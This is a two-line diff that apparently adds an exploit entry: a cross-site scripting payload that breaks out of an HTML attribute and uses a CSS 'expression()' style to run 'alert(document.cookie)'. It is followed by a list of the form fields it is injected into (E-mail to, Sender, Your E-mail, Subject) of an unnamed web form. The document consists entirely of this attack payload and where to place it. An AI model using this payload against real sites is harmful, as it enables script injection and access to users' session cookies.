@@ -1,0 +1,2 @@
+" style="xss:expression(alert(document.cookie))
+In fields: E-mail to, Sender, Your E-mail, Subject.
